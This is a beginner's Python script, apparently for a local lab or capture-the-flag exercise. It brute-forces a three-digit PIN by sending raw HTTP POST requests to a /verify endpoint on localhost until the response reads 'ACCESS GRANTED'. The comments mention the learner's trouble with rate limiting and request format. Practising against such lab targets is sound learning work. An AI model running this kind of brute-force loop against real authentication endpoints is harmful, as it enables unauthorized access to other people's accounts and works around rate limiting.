#the first cod that i create, but the problem is that there is not deley ouput so the server respose "wow, slow down"
#and the code that take me 4 hours to figure it out why even i get ot 999 i still got all the pin guess wrong
#as that i use the HTML or HTTP body of the GET instead of the POST
import socket

HOST = '127.0.0.1'
PORT = 8888

def send_post_request(pin):

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        request = f"POST /verify HTTP/1.1\r\n"
        request += f"Host: {HOST}:{PORT}\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += "Connection: close\r\n"
        request += f"Content-Length: {len(f'magicNumber={pin}')}\r\n\r\n"
        request += f"magicNumber={pin}"

        s.sendall(request.encode())

        response = s.recv(4096)
        return response.decode()

def main():
    for pin in range(1000):
        pin_str = f"{pin:03d}"
        print(f"Trying PIN: {pin_str}")

        response = send_post_request(pin_str)

        if "ACCESS GRANTED" in response:
            print(f"Correct PIN found: {pin_str}")
            break
        else:
            print(f"Incorrect PIN: {pin_str}")

if __name__ == "__main__":
    main()
